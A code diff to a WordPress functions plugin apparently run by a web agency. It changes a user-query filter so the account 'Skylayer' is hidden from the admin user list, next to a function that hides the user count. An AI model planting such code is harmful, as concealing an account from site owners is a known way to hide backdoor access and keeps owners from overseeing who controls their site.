@@ -7,7 +7,7 @@
  * Author URI: https://skylayer.eu
  * GitHub Plugin URI: danielslyman/skylayer-functions
  * GitHub Plugin URI: https://github.com/danielslyman/skylayer-functions/
- * Version: 1.1
+ * Version: 1.2
  */
 
 /* Place custom code below this line. */
@@ -61,15 +61,11 @@ function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
 
-  if ($username == 'danny_temp') { 
-
-  }
-
-  else {
     global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
-      "WHERE 1=1 AND {$wpdb->users}.user_login != 'danny_temp'",$user_search->query_where);
-  }
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Skylayer'",
+	   $user_search->query_where);
+	
 }
 
 function hide_user_count(){
@@ -81,8 +77,8 @@ function hide_user_count(){
 }
 
 add_action('admin_head','hide_user_count');
-
 /* User Obscurity. */
+
 
 
 
